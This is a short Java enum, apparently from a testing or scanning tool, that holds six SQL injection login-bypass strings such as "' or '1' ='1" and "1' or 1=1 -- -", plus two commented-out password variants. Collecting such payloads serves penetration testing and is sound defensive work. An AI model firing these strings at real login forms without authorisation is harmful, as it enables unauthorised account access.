package com.george.tailor.data;

public enum LoginSequences {
	USER_LOGIN_1_SEQUENCE("' or '1' ='1"),
	USER_LOGIN_2_SEQUENCE("' or ' 1=1"),
	USER_LOGIN_3_SEQUENCE("1' or 1=1 -- -"),
	USER_LOGIN_4_SEQUENCE("\") or 1=(\"1"),
	USER_LOGIN_5_SEQUENCE("\") or 1=(\"1\")-- -"),
	USER_LOGIN_6_SEQUENCE("') or 1=('1') -- -");
	
	
	//public final String PASSWORD_LOGIN_1_SEQUENCE = "' or '1' ='1",
	//public final String PASSWORD_LOGIN_2_SEQUENCE = "' or ' 1=1";
	
	private final String text;

    private LoginSequences(final String text) {
        this.text = text;
    }

    @Override
    public String toString() {
        return text;
    }
}
